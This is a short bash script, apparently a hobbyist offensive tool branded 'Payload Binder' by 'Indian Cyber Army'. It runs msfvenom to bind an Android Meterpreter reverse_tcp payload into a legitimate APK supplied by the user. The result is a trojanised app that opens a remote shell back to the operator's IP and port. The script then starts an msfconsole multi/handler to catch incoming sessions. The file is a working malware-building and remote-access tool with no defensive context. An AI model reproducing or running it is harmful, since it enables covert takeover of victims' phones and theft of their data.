#!/bin/bash

echo -e "\033[0;33m"
echo "Executing the Payload Binder ..."
echo -e "\033[0;36m"
read -p "    Enter your IP/Host Address ===> " ip
read -p "    Enter listener port ===> " Port  
read -p "    Enter main apk path ===> " a  
read -p "|---Set the name and path to save the binded payload
|----> " Path               
msfvenom -x $a -p android/meterpreter/reverse_tcp lhost=$ip lport=$Port R> $Path
clear
clear
    echo -e "\033[0;37m"
echo "      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ "
echo "     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|"
echo "     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  "
echo "     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  "
echo "     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  "
echo -e "\033[0;31m     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________"
echo -e "\033[0;29m                               FOR ANDROID ONLY"
    echo -e "\033[0;37m                           MADE BY:INDIAN CYBER ARMY"
    echo -e "\033[0;34m          YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5"
    echo -e "\033[0;29m"

read -p "Do you want to Execute the listener?
 y) Execute the listener
 n) Exit 
 enter y or n (Default y) ===> " yn
 
echo -e "\033[0;33m"
case $yn in
y) echo Executing the listener ...;;
n) echo exiting ...;
sleep 1
exit 1

esac
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
